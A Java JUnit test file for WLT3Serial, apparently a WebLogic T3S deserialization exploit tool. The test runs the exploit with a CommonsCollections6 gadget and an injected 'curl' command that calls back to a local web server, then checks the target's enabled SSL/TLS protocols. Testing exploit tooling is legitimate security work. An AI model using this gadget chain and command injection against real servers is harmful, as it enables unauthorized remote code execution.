/*
	SSLv2Test.java
	
	v0.4 (10/23/2018)

	Test to ensure WLT3Serial communicates via T3S with SSLv2
*/

package bort.millipede.wlt3.tests.ssltls;

import java.io.IOException;
import java.net.Socket;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

import bort.millipede.wlt3.tests.WLT3SerialTestHelper;
import bort.millipede.wlt3.tests.WebServerTestHelper;
import org.junit.Assert;
import org.junit.Test;
import org.junit.Before;
import org.junit.After;

public class SSLv2Test {
	WebServerTestHelper ws;
	
	@Before
	public void setUp() throws IOException {
		try {
			ws = new WebServerTestHelper();
		} catch(IOException ioe) {
			throw new IOException("Embedded web server component failed to start!",ioe);
		} catch(Exception e) {
			throw e;
		}
	}
	
	@After
	public void tearDown() {
		try {
			ws.stop();
		} catch(Exception e) {
			//don't care
		}
	}
		
	@Test
	public void testAssertUsingSSLv2() {
		//check input properties and run exploit
		WLT3SerialTestHelper.checkTargetParams();
		String host = System.getProperty("wlt3.target.host");
		String strPort = System.getProperty("wlt3.target.t3s.port");
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit("--t3s=SSLv2",null,"CommonsCollections6","curl http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path);
		
		//create socket for retrieving SSLSocketFactory
		int port = Integer.parseInt(strPort);
		Socket sock = null;
		try {
			sock = new Socket(host,port);
		} catch (Exception e) {
			throw new AssertionError("Error connecting to "+host+":"+strPort+"!");
		}
		SSLSocketFactory defaultFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
		
		//create SSLSocket and retrieve enabled protocol(s)
		SSLSocket sslSock = null;
		try {
			sslSock = (SSLSocket) defaultFactory.createSocket(sock,host,port,true);
		} catch (Exception e) {
			throw new AssertionError("Error connecting to "+host+":"+strPort+"via SSL/TLS!");
		}
		String[] prots = sslSock.getEnabledProtocols();
		
		//Assert that only 2 SSL/TLS protocols are enabled and that they are SSLv2Hello and SSLv3
		Assert.assertEquals("Incorrect SSL/TLS protocol(s) enabled, rather than only SSLv2Hello and SSLv3!",2,prots.length);
		Assert.assertArrayEquals("Protocols other than SSLv2Hello and SSLv3 enabled",new String[] {"SSLv2Hello","SSLv3"},prots);
		
		//attempt to close SSLSocket, ignore any errors
		try {
			sslSock.close();
		} catch (Exception e) {
			//don't care
		}
	}
}

